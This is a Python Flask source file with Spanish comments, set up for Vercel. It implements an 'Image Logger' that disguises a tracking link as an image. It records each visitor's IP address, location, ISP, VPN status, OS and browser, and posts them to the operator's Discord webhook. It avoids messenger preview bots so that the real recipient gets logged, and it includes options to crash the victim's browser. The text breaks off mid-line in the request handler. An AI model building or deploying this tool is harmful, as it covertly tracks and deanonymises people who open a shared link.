import os
from flask import Flask, request, Response
from urllib import parse
import traceback, requests, base64, httpagentparser

# --- INICIO: CONFIGURACIÓN Y FUNCIONES ORIGINALES ---

# ¡¡¡MUY IMPORTANTE!!!
# Reemplaza "TU_WEBHOOK_URL_AQUI" con la URL real de tu webhook de Discord.
config = {
    "webhook": "TU_WEBHOOK_URL_AQUI",
    "image": "https://app.skin.land/blogfiles/REmN8T5suNv7t4ZC4cqm4Cp7DoG4vBZWtJJXoyUU.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [ {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            } ],
        })
    except Exception:
        pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
                    "username": config["username"],
                    "content": "",
                    "embeds": [ {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    } ],
                })
            except Exception:
                pass
        return
    
    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info.get("proxy"):
            if config["vpnCheck"] == 2: return
            if config["vpnCheck"] == 1: ping = ""
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if not info.get("proxy"): return
            elif config["antiBot"] == 3: return
            elif config["antiBot"] == 2:
                if not info.get("proxy"): ping = ""
            elif config["antiBot"] == 1: ping = ""
    except Exception:
        info = {}

    os_info, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [ {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!** **Endpoint:** `{endpoint}` **IP Info:** > **IP:** `{ip if ip else 'Unknown'}` > **Provider:** `{info.get('isp', 'Unknown')}` > **ASN:** `{info.get('as', 'Unknown')}` > **Country:** `{info.get('country', 'Unknown')}` > **Region:** `{info.get('regionName', 'Unknown')}` > **City:** `{info.get('city', 'Unknown')}` > **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'}) > **Timezone:** `{info.get('timezone', 'N/A').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else 'N/A'} ({info.get('timezone', 'N/A').split('/')[0] if '/' in info.get('timezone', '') else 'N/A'})` > **Mobile:** `{info.get('mobile', 'Unknown')}` > **VPN:** `{info.get('proxy', 'Unknown')}` > **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}` **PC Info:** > **OS:** `{os_info}` > **Browser:** `{browser}` **User Agent:** ``` {useragent} ```""",
        } ],
    }
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json = embed)
    except Exception:
        pass
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!\$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# --- FIN: CONFIGURACIÓN Y FUNCIONES ORIGINALES ---


# --- INICIO: APLICACIÓN FLASK PARA VERCEL ---

app = Flask(__name__)

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def handler(path):
    try:
        ip = request.headers.get('x-forwarded-for',
